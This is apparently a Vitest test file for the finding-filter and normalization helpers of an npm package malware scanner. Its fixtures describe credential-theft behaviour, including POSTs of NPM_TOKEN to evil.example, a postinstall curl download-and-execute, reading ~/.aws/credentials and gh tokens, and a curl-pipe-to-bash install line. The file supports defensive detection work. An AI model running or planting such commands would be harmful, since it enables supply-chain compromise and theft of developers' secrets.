import { describe, expect, it } from "vitest";
import type { Hypothesis } from "@npmguard/shared";
import type { Finding } from "../models.js";
import {
  buildAgentTextFallbackFinding,
  filterActionableFindings,
  isBenignFinding,
  isBenignInvestigationSummary,
  normalizeInvestigationFinding,
} from "./investigate.js";

function finding(overrides: Partial<Finding> = {}): Finding {
  return {
    capability: "NETWORK",
    confidence: "CONFIRMED",
    fileLine: "index.js:1-10",
    problem: "posts process.env.NPM_TOKEN to a remote endpoint",
    evidence: "require_and_trace observed POST https://evil.example/collect",
    reproductionStrategy: "Run require_and_trace and assert the POST occurs",
    ...overrides,
  };
}

function hypothesis(overrides: Partial<Hypothesis> = {}): Hypothesis {
  return {
    hypId: overrides.hypId ?? "trg-0001",
    description: overrides.description ?? "bundle inspects environment secrets",
    claim: overrides.claim ?? { kind: "cred_theft", gating: null },
    focusFiles: overrides.focusFiles ?? ["bundle.js"],
    focusLines: overrides.focusLines ?? [{ file: "bundle.js", range: "3732562-3734822" }],
    severity: overrides.severity ?? "medium",
    parentHypId: null,
    childHypIds: [],
    state: overrides.state ?? "OPEN",
    createdBy: "triage",
    evidenceRefs: [],
    createdAt: "2026-07-01T12:00:00.000Z",
    resolvedAt: null,
    resolution: null,
  };
}

describe("isBenignFinding", () => {
  it("filters absence-of-risk findings from investigation output", () => {
    expect(
      isBenignFinding(finding({
        capability: "NETWORK",
        problem: "No network I/O operations observed during module loading and schema parsing",
        evidence: "Zero HTTP/HTTPS requests, zero fetch() calls, zero data exfiltration.",
      })),
    ).toBe(true);

    expect(
      isBenignFinding(finding({
        capability: "CREDENTIAL_THEFT",
        problem: "No credential theft mechanisms present in published files",
        evidence: "No process.env, process.argv, child_process, exec(), spawn() calls in published files.",
      })),
    ).toBe(true);
  });

  it("filters benign explanations for legitimate or type-only code", () => {
    expect(
      isBenignFinding(finding({
        capability: "FILESYSTEM",
        problem: ".d.cts files are standard TypeScript declaration files (types only) - not executable code",
        evidence: "Node.js does not execute .d.ts/.d.cts declaration files.",
      })),
    ).toBe(true);

    expect(
      isBenignFinding(finding({
        capability: "EVAL",
        problem: "allowsEval runtime probe detects if dynamic code construction is allowed - intentional feature detection",
        evidence: "Only affects JIT fastpath and falls back to safe recursive traversal.",
      })),
    ).toBe(true);

    expect(
      isBenignFinding(finding({
        capability: "OBFUSCATION",
        problem: "This result does not contain any suspicious or malicious behavior",
        evidence: "The watchdog is a documented process-lifecycle helper.",
      })),
    ).toBe(true);

    expect(
      isBenignFinding(finding({
        capability: "PROCESS_SPAWN",
        problem: "process.domain is temporarily cleared and restored",
        evidence: "This is likely an intentional design choice for internal scheduling.",
      })),
    ).toBe(true);
  });

  it("keeps actionable malicious findings", () => {
    expect(isBenignFinding(finding())).toBe(false);

    expect(
      isBenignFinding(finding({
        capability: "PROCESS_SPAWN",
        problem: "postinstall spawns curl to download and execute a binary",
        evidence: "runLifecycleHook observed child_process.spawn('curl', ['https://evil.example/a'])",
      })),
    ).toBe(false);
  });
});

describe("buildAgentTextFallbackFinding", () => {
  it("creates a confirmed finding from malicious agent text when extraction returns zero findings", () => {
    const fallback = buildAgentTextFallbackFinding(
      "Package is confirmed malicious credential theft malware.",
      "It steals AWS credentials, GitHub tokens, and NPM tokens, then exfiltrates them as part of Shai-Hulud propagation.",
      [hypothesis()],
    );

    expect(fallback).toMatchObject({
      capability: "CREDENTIAL_THEFT",
      confidence: "CONFIRMED",
      fileLine: "bundle.js:3732562-3734822",
    });
    expect(fallback?.evidence).toContain("Shai-Hulud");
  });

  it("returns null for benign investigation text", () => {
    expect(
      buildAgentTextFallbackFinding(
        "Investigation found no malicious behavior; the package is safe.",
        "No credential access, no network exfiltration, and no lifecycle abuse were observed.",
        [hypothesis()],
      ),
    ).toBeNull();
  });

  it("prefers a high severity hypothesis focus for the fallback file reference", () => {
    const fallback = buildAgentTextFallbackFinding(
      "Malicious package exfiltrates secrets.",
      "The agent text describes token theft and remote exfiltration.",
      [
        hypothesis({ severity: "medium", focusFiles: ["index.js"], focusLines: [{ file: "index.js", range: "1-20" }] }),
        hypothesis({ severity: "high", focusFiles: ["setup.js"], focusLines: [{ file: "setup.js", range: "28-39" }] }),
      ],
    );

    expect(fallback?.fileLine).toBe("setup.js:28-39");
    expect(fallback?.confidence).toBe("LIKELY");
  });
});

describe("normalizeInvestigationFinding", () => {
  it("enriches skeleton UNKNOWN findings using reproduction text and summary", () => {
    const normalized = normalizeInvestigationFinding(
      finding({
        capability: "UNKNOWN",
        confidence: "SUSPECTED",
        fileLine: "1",
        problem: "",
        evidence: "",
        reproductionStrategy:
          "Install the package. The postinstall reads ~/.aws/credentials, runs gh auth token, reads NPM_TOKEN, and exfiltrates secrets.",
      }),
      "This package is CONFIRMED as malicious credential theft malware with npm token theft.",
      "",
      [hypothesis()],
    );

    expect(normalized).toMatchObject({
      capability: "NPM_TOKEN_ABUSE",
      fileLine: "bundle.js:3732562-3734822",
      confidence: "SUSPECTED",
    });
    expect(normalized.problem).toContain("CONFIRMED");
    expect(normalized.evidence).toContain("NPM_TOKEN");
  });

  it("does not let an unrelated global summary override a finding's local capability", () => {
    const normalized = normalizeInvestigationFinding(
      finding({
        capability: "PROCESS_SPAWN",
        problem: "preinstall executes curl and pipes the downloaded script to bash",
        evidence: "execSync('curl -fsSL https://bun.sh/install | bash')",
        reproductionStrategy: "Trace the preinstall process invocation",
      }),
      "Other findings in this package steal GitHub and npm credentials.",
      "The complete investigation also contains CREDENTIAL_THEFT and ENV_VARS findings.",
      [hypothesis()],
    );

    expect(normalized.capability).toBe("PROCESS_SPAWN");
  });
});

describe("filterActionableFindings", () => {
  it("drops zod-style non-issues while retaining real findings", () => {
    const kept = finding({
      capability: "ENV_VARS",
      problem: "reads process.env.NPM_TOKEN and sends it over HTTPS",
      evidence: "Trace observed env access followed by POST https://evil.example/token",
    });
    const filtered = filterActionableFindings([
      finding({
        capability: "LIFECYCLE_HOOK",
        problem: "No lifecycle hooks present in package.json",
        evidence: "None execute during package installation.",
      }),
      finding({
        capability: "PERFORMANCE",
        problem: "ModeWriter invoked twice - performance concern, not security issue",
        evidence: "Safe but potentially inefficient.",
      }),
      kept,
    ]);

    expect(filtered).toEqual([kept]);
  });
});

describe("isBenignInvestigationSummary", () => {
  it("detects summaries that explicitly refute the triage signal", () => {
    expect(
      isBenignInvestigationSummary(
        "Investigation found no malicious behavior. All prior flags were false positives.",
      ),
    ).toBe(true);

    expect(
      isBenignInvestigationSummary(
        "Runtime execution confirmed no network calls, filesystem writes, process spawning, or credential theft.",
      ),
    ).toBe(false);
  });
});
